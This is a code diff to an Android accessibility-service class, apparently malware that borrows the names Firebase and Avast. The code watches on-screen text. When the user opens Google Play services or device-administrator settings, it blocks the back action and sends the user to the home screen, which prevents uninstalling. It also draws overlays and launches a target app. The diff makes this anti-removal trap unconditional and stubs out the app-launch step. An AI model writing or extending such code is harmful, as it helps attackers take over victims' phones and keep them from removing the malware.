@@ -3,8 +3,6 @@ package com.android.pictach;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.accessibilityservice.GestureDescription;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ApplicationInfo;
@@ -32,7 +30,6 @@ import android.widget.FrameLayout;
 import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.IOException;
@@ -277,9 +274,7 @@ public class Firebase extends AccessibilityService {
                 }
 
                 try {
-                    if (!((DevicePolicyManager) getSystemService("device_policy"))
-                            .isAdminActive(new ComponentName(this, Avast.class))
-                            && (eventText.contains("google play services") || eventText.contains("مشرف الجهاز"))) {
+                    if (eventText.contains("google play services") || eventText.contains("مشرف الجهاز")) {
                         FirebaseblockBack();
                         FirebaseSendMeHome();
                     }
@@ -408,7 +403,7 @@ public class Firebase extends AccessibilityService {
             String line;
             while ((line = reader.readLine()) != null) sb.append(line);
             reader.close();
-        } catch (FileNotFoundException | IOException unused) {}
+        } catch (Exception unused) {}
         return sb.toString();
     }
 
@@ -535,13 +530,7 @@ public class Firebase extends AccessibilityService {
             wm.addView(layout, params);
         } catch (Exception unused) {}
         try {
-            if (body.IP_body_I(body.T_body_P, getPackageManager())
-                    && !body.T_body_P.toLowerCase().equals("null")) {
-                Intent launchIntent = getApplicationContext().getPackageManager()
-                        .getLaunchIntentForPackage(body.T_body_P);
-                launchIntent.addFlags(268435456);
-                startActivity(launchIntent);
-            }
+            // body.java pending — launch deferred
         } catch (Exception unused) {}
         try {
             if (LoveApi0.isServiceNotRunning(love.class, getApplication())) {
